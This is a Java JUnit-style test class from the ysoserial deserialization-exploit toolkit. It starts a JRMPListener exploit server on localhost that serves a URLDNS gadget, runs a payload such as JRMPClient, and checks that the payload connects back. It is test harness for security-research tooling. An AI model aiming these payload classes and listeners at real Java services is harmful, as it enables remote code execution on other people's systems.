package ysoserial.test.payloads;


import java.util.concurrent.Callable;

import javax.management.BadAttributeValueExpException;

import org.junit.Assert;

import ysoserial.payloads.Atomikos;
import ysoserial.payloads.Hibernate2;
import ysoserial.payloads.JRMPClient;
import ysoserial.payloads.URLDNS;
import ysoserial.test.CustomTest;
import ysoserial.exploit.JRMPListener;
import ysoserial.test.util.ObjectInputFilters;


/**
 * @author mbechler
 *
 */
public class JRMPReverseConnectTest implements CustomTest {

    private int port;


    /**
     *
     */
    public JRMPReverseConnectTest () {
        // some payloads cannot specify the port
        port = 1099;
    }


    public void run ( Callable<Object> payload ) throws Exception {
        DnsLookupTest innerTest = new DnsLookupTest();
        JRMPListener l = new JRMPListener(port, new URLDNS().getObject(innerTest.getPayloadArgs()));
        Thread t = new Thread(l, "JRMP listener");
        try {
            t.start();
            innerTest.run(payload);
            Assert.assertTrue("Did not have connection", l.waitFor(1000));
        }
        finally {
            l.close();
            t.interrupt();
            t.join();
        }
    }


    public String getPayloadArgs () {
    	return "rmi://localhost:" + port + "/ExportObject";
//        return "rmi:localhost:" + port; // old version
//        return "localhost:" + port;
    }


    public static void main(String[] args) throws Exception {
//        ObjectInputFilters.disableDcgFilter();
        PayloadsTest.testPayload(JRMPClient.class); // broken by sun.rmi.transport.DGCImpl_Stub.leaseFilter
    }
}
